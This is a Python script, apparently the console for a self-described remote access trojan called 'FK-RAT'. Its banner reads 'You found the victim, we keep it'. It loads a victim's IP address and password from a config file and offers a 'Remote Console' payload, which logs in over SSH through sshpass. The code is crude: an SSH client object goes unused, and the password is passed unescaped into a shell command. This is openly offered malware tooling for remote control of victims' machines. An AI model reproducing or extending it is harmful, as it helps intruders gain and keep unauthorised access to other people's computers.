#!/usr/bin/python
# python console for FK-RAT
# created by: Sunnickel
# inspired by: COSMO

# import
import os
import sys
import getpass
from paramiko import SSHClient
from modules import *

## variables
banner ="""
 ▄▀▀▀█▄    ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄ 
█  ▄▀  ▀▄ █   █  █  █  █ █ █ █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐     █  █ ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ █   █   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ 
▐ █▄▄▄▄   ▐   █  ▐  ▐  █  ▀█ ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄       ▐  █▀▄    █▄▄▄▄▄    █▄▄▄▄▄  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄   
 █    ▐       █       █   █    █    █   █    ▌   ▄▀    █  ▀▄   █        █   █   █    ▌    █    ▌     █        █    ▌   ▄▀    █  ▀▄   █  
 █         ▄▀▀▀▀▀▄  ▄▀   █    ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █     █    █▀▀▀       ▄▀   █   ▄▀▄▄▄▄    ▄▀▄▄▄▄    ▄▀        ▄▀▄▄▄▄   █     █    █▀▀▀   
█         █       █ █    ▐   █     ▐   █    ▐   ▐     ▐    ▐          █    ▐   █    ▐    █    ▐   █          █    ▐   ▐     ▐    ▐      
▐         ▐       ▐ ▐        ▐         ▐                              ▐        ▐         ▐        ▐          ▐                          


        [::] Finders Keepers | You found the victim, we keep it
        [::] Created by : Sunnickel
        [::] Inspired by : BlueCosmo
"""
help_menu = """
        
        
        Arguments:
            xxx.fkrat = config file to add to 

        Example:
            python3 main.py -f sunnickel.fkrat


"""
option_menu = """
        [*] Select a number to use a payload

        Payloads:
            [0]     Remote Console
"""

username = getpass.getuser()
header = f"{username}@FK-RAT $ "

# read config file
def read_config(config_file):
    configuration = {}

    # get file content
    read_lines = open(config_file, "r").readlines()

    # get target information
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIR"] = read_lines[2].strip()

    # return config
    return configuration

# connects RAT to target
def connect():
    config = read_config(sys.argv[1])
    ipv4 = config.get("IPADDRESS")
    traget_password = config.get("PASSWORD")
    working_directory = config.get("WORKINGDIR")

    # remote connect
    target = SSHClient()

    os.system(f"sshpass -p \"{traget_password}\" ssh fkrat@{ipv4}")


# command line interface
def cli(arguments):
    print(banner)
    if arguments:
        print(option_menu)
        option = input(header)

        if option == "0":
            connect()
    else:
        print(help_menu)

# detects what os is used
def os_detection():
    # windows
    if os.name == "nt":
        return "w"
    # linux
    if os.name == "posix":
        return "l"

# main code
def main():
    ## check for args
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    cli(arguments_exist)

# run main code
if __name__ == "__main__":
    main()
